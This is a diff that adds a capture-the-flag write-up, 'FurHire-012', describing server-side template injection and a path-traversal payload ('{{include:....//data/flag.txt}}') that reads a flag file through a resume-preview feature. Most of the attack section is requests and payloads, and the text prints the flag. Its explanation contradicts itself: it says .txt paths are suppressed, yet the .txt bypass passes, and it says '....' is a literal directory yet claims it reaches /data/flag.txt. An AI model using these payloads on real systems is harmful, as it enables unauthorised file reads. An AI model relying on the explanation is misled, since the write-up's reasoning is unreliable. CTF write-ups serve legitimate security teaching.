@@ -1,0 +1,56 @@
+---
+title: "FurHire-012 - Path Traversal Sanitizer Bypass in Resume-Preview"
+date: 2026-06-29
+author: Shawn Szczepkowski
+---
+
+**Vuln class:** LFI via custom template directive; regex suppressor bypass  
+**Flag:** `bug{ot2yyBVNNC4gs2J04BgxEq5Hd6MbSWJn}`
+
+---
+
+## Attack Chain
+
+### 1. Identify the template engine
+
+Upload any non-PDF file as resume (server only validates MIME, not magic bytes):
+
+```
+POST /api/profile/resume
+Content-Type: multipart/form-data
+[file content]: {{name}}
+```
+
+`GET /api/profile/resume/preview` → returns username. Confirms server-side template substitution. Allowlist: `{{name}}`, `{{bio}}`, `{{location}}`.
+
+### 2. Find the include directive
+
+Test `{{include:x}}` → returns **`flag is elsewhere`** (server hint).  
+Test `{{include:flag.txt}}` → returns **`''`** (blank — suppressed).
+
+The suppressor blocks paths matching a `.txt` pattern; non-`.txt` paths return the clue string but are not read from disk.
+
+### 3. Bypass the suppressor with four-dot traversal
+
+Flag is at `/data/flag.txt`, not at filesystem root or app root. The suppressor regex matches simple forms (`flag.txt`, `./flag.txt`, `/flag.txt`) but does **not** match `....//data/flag.txt`.
+
+Upload resume with content:
+
+```
+{{include:....//data/flag.txt}}
+```
+
+Preview → returns flag.
+
+---
+
+## Why the Bypass Works
+
+| Path | Suppressor | File read |
+|---|---|---|
+| `flag.txt` | blocked (matches) | — |
+| `../flag.txt` | blocked | — |
+| `/data/flag.txt` | blocked | — |
+| `....//data/flag.txt` | **passes** | `/data/flag.txt` ✓ |
+
+`....` (four dots) is treated as a literal directory component, not `..`. Combined with `//` (double slash collapses to `/`), Node.js path resolution reaches `/data/flag.txt` while the regex sees an unusual prefix and does not suppress it.
